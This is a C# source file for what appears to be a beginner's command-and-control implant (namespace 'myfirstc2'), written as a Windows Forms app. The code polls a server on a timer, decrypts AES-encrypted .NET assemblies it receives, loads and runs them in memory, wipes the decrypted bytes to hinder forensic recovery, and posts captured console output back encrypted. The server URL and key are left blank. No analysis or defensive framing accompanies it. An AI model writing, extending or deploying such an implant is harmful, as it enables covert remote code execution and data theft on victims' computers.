using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;
using System.Reflection;

namespace myfirstc2
{
    public partial class Form1 : Form
    {
        private byte[] cleartext;
        private byte[] assembly;
        private StringWriter sw = new StringWriter();
        private byte[] key;

        Configuration configuration = new Configuration();
        public Form1()
        {
            InitializeComponent();
        }

        private byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length).Where(x => x % 2 == 0).Select(x => Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Console.SetOut(sw);
            configuration.key = "";
            configuration.url = "";

            string[] master = configuration.key.Split('.');
            byte[] key1 = StringToByteArray(master[0].Replace("-", ""));
            byte[] key2 = StringToByteArray(master[1].Replace("-", ""));
            IEnumerable<byte> final = key1.Concat(key2);
            key = final.ToArray();

            timer1.Tick += new EventHandler(CallForData);
            timer1.Interval = 3000;
            timer1.Start();
        }

        private void CallForData(object sender, EventArgs ea)
        {
            textBox1.AppendText("CallForData called\r\n");
            ResponseAPI response = HTTPRequest($"api/{Guid.NewGuid()}", "");
            try
            {
                textBox1.AppendText($"got data: {response.Message}\r\n");
                if(response.Message.Equals("update"))
                {
                    if (assembly != null)
                    {
                        Assembly a = Assembly.Load(assembly);
                        MethodInfo method = a.EntryPoint;
                        textBox1.AppendText($"entry point is {a.EntryPoint}\r\n");
                        if (method != null)
                        {
                            object o = a.CreateInstance(method.Name);
                            method.Invoke(null, new object[] { (object[])null });
                        }
                        
                        try
                        {
                            unsafe
                            {
                                int size = assembly.Length;
                                byte[] cleantext = new byte[size];
                                for (int i = 0; i < size; i++)
                                {
                                    cleantext[i] = 0xaa;
                                }

                                fixed (byte* ptr = assembly)
                                {
                                    textBox1.AppendText($"ptr addr is : 0x{new IntPtr(ptr).ToString("X")}");
                                    Marshal.Copy(cleantext, 0, new IntPtr(ptr), size);
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            textBox1.AppendText(e.Message + "\r\n");
                        }
                        
                        SendOutput();
                    }
                }
            } catch(Exception e)
            {
                textBox1.AppendText($"error: {e.Message}");
            }
        }

        private void SendOutput()
        {
            string data = sw.ToString();
            textBox1.AppendText($"=======================\r\n{data}\r\n");
            sw.Flush();
            sw.Close();
            sw = new StringWriter();

            data = EncryptAES(data, key);
            HTTPRequest($"api/{Guid.NewGuid()}", data);
        }

        private ResponseAPI HTTPRequest(string url, string data, string method = "POST")
        {
            string response = "";
            Stream s = null;
            StreamReader sr = null;
            HttpWebRequest hwr = (HttpWebRequest)WebRequest.Create($"{configuration.url}/{url}");
            hwr.Method = method;
            hwr.ContentType = "application/json";
            hwr.Headers.Add($"X-License: {configuration.key}");
            hwr.Proxy.Credentials = CredentialCache.DefaultCredentials;

            byte[] body = Encoding.ASCII.GetBytes($"data={data}");

            try
            {
                s = hwr.GetRequestStream();
                s.Write(body, 0, body.Length);
            } catch(Exception e)
            {
                textBox1.AppendText($"Send HTTPRequest failed {e.Message}\r\n");
            }
            finally
            {
                if(s != null)
                {
                    s.Dispose();
                }
            }

            try
            {
                s = hwr.GetResponse().GetResponseStream();
                sr = new StreamReader(s);
                response = sr.ReadToEnd();
            } catch(Exception e)
            {
                textBox1.AppendText($"Recv HTTPRequest failed {e.Message}\r\n");
            }

            try
            {
                ResponseAPI api = JsonSerializer.Deserialize<ResponseAPI>(response);
                // decrypt DATA here
                if(api.Data.Length != 0)
                {
                    DecryptAES(Convert.FromBase64String(api.Data), key);
                }
                return api;
            } catch(Exception e)
            {
                // textBox1.AppendText($"JSON HTTPRequest failed {e.Message}\r\n");
            }
            return null;
        }

        private void DecryptAES(byte[] cipher, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = new byte[16];

                ICryptoTransform ict = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, ict, CryptoStreamMode.Read))
                    {
                        cleartext = new byte[cipher.Length];
                        int byteRead = cs.Read(cleartext, 0, cleartext.Length);
                        assembly = cleartext.ToArray();
                        
                        try
                        {
                            unsafe
                            {
                                int size = cleartext.Length;
                                byte[] cleantext = new byte[size];
                                for(int i = 0; i < size; i++)
                                {
                                    cleantext[i] = 0xcc;
                                }

                                fixed(byte *ptr = cleartext)
                                {
                                    textBox1.AppendText($"ptr addr is : 0x{new IntPtr(ptr).ToString("X")}");
                                    Marshal.Copy(cleantext, 0, new IntPtr(ptr), size);
                                }
                            }
                        } catch(Exception e)
                        {
                            textBox1.AppendText(e.Message + "\r\n");
                        }
                    }
                }
            }
        }

        private string EncryptAES(string plain, byte[] key)
        {
            byte[] encrypted;
            using(Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = new byte[16];

                ICryptoTransform ict = aes.CreateEncryptor(aes.Key, aes.IV);

                using(MemoryStream ms = new MemoryStream())
                {
                    using(CryptoStream cs = new CryptoStream(ms, ict, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plain);
                        }
                        encrypted = ms.ToArray();
                    }

                }
                return Convert.ToBase64String(encrypted);
            }
        }
    }

    public class ResponseAPI
    {
        public string Data { get; set; }
        public string Message { get; set; }
        public bool Error { get; set; }
    }

    public class Configuration
    {
        public string key { get; set; }
        public string url { get; set; }
    }
}

